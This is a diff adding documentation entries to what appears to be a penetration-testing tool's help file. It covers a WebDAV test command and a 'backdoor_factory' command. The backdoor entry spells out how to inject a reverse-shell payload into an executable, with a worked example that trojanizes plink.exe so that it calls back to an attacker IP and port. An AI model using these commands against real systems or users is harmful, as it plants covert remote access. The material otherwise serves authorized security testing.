@@ -5009,6 +5009,49 @@ Replace `<target_host>` with the IP address or hostname of the target system.
 For example:
     apache-users -h 192.168.1.202 -l /usr/share/wordlists/metasploit/unix_users.txt -p 80 -s 0 -e 403 -t 10
 
+## backdoor_factory
+Creates a backdoored executable using `backdoor-factory`.
+
+This function checks if `backdoor-factory` is installed, installs it if necessary, and then uses it to 
+inject a reverse shell payload into a specified binary file. The binary is backdoored with a 
+reverse shell payload that connects back to a specified host and port.
+
+:param line: The absolute path to the file that will be backdoored. If not provided, the user is prompted 
+            to enter the path.
+
+:returns: None
+
+Manual execution:
+To manually create a backdoored executable, use the following command:
+    backdoor-factory -f <file_path> -H <lhost> -P <lport> -s reverse_shell_tcp_inline -J -a -c -l 128 -o <output_file>
+
+Replace `<file_path>` with the path to the binary you want to backdoor, `<lhost>` with the IP address of 
+the attacker’s machine, and `<lport>` with the port number to listen on. The `<output_file>` is the path 
+where the backdoored binary will be saved.
+
+For example:
+    backdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp_inline -J -a -c -l 128 -o sessions/backdoor_factory.exe
+
+## davtest
+Tests WebDAV server configurations using `davtest`.
+
+This function checks if `davtest` is installed and installs it if necessary. It then runs `davtest` 
+to perform a WebDAV server test against a specified URL or the default URL configured in `self.params`.
+
+:param line: The URL of the WebDAV server to test. If provided, it overrides the default URL. 
+            If not provided, the function uses the URL specified in `self.params["rhost"]`.
+
+:returns: None
+
+Manual execution:
+To manually test a WebDAV server, use the following command:
+    davtest --url <url>
+
+Replace `<url>` with the URL of the WebDAV server you want to test.
+
+For example:
+    davtest --url http://example.com/webdav
+
 ## find_tgts
 No description available.
 
